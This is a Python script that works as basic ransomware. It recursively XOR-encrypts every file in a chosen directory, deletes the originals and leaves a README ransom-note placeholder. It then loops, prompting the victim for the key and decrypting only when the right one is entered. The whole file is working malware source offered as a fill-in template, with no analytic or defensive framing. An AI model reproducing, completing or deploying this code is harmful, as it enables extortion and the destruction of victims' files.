#importing the necessary libraries
import os
import random
import string
import shutil

#creating a function to encrypt the files
def encrypt_files(file_name, key):
    #opening the file in read binary mode
    with open(file_name, 'rb') as f:
        #reading the file content
        data = f.read()
    #encrypting the file content
    encrypted_data = bytearray([data[i] ^ key[i % len(key)] for i in range(len(data))])
    #creating a new file with .encrypted extension
    new_file_name = file_name + '.encrypted'
    #opening the new file in write binary mode
    with open(new_file_name, 'wb') as f:
        #writing the encrypted data to the new file
        f.write(encrypted_data)
    #deleting the original file
    os.remove(file_name)

# Specify your encryption key here
encryption_key = b'YourEncryptionKey'  # Replace 'Your Encryption Key' with the desired encryption key.

#creating a function to encrypt all the files in the given directory
def encrypt_all_files(directory, key):
    #looping through all the files in the directory
    for filename in os.listdir(directory):
        #getting the absolute path of the file
        file_path = os.path.join(directory, filename)
        #checking if the file is a directory
        if os.path.isdir(file_path):
            #recursively calling the encrypt_all_files function
            encrypt_all_files(file_path, key)
        else:
            #encrypting the file
            encrypt_files(file_path, key)
    #creating a file containing the key
    with open('README.txt', 'wb') as f:
        f.write(b'Your message')
    #moving the key file to the given directory
    shutil.move('README.txt', directory)

#creating a function to decrypt all the files in the given directory
def decrypt_all_files(directory, key):
    #looping through all the files in the directory
    for filename in os.listdir(directory):
        #getting the absolute path of the file
        file_path = os.path.join(directory, filename)
        #checking if the file is a directory
        if os.path.isdir(file_path):
            #recursively calling the decrypt_all_files function
            decrypt_all_files(file_path, key)
        else:
            #checking if the file has .encrypted extension
            if filename.endswith('.encrypted'):
                #decrypting the file
                decrypt_files(file_path, key)

#creating a function to decrypt the files
def decrypt_files(file_name, key):
    #opening the file in read binary mode
    with open(file_name, 'rb') as f:
        #reading the file content
        data = f.read()
    #decrypting the file content
    decrypted_data = bytearray([data[i] ^ key[i % len(key)] for i in range(len(data))])
    #creating a new file without .encrypted extension
    new_file_name = file_name[:-10]  # Assuming the encrypted file extension is '.encrypted'
    #opening the new file in write binary mode
    with open(new_file_name, 'wb') as f:
        #writing the decrypted data to the new file
        f.write(decrypted_data)
    #deleting the encrypted file
    os.remove(file_name)

# Define the directory path here (replace with your desired directory)
directory = '/path/to/your/directory'  # Replace it '/path/to/your/directory' with the directory path you want to encrypt.

# Encrypt all the files in the given directory using the specified encryption key
encrypt_all_files(directory, encryption_key)

while True:
    # Get the decryption key from the user
    os.system("clear")
    print("Please enter the decryption key")
    user_key = input('Enter the key to decrypt the files: ')

    # Check if the user_key matches the encryption_key
    if user_key.encode() == encryption_key:
        # Decrypt all the files in the given directory using the same encryption key
        decrypt_all_files(directory, encryption_key)
        break  # Keluar dari loop jika kunci benar
    else:
        print("Wrong key. Please try again.")
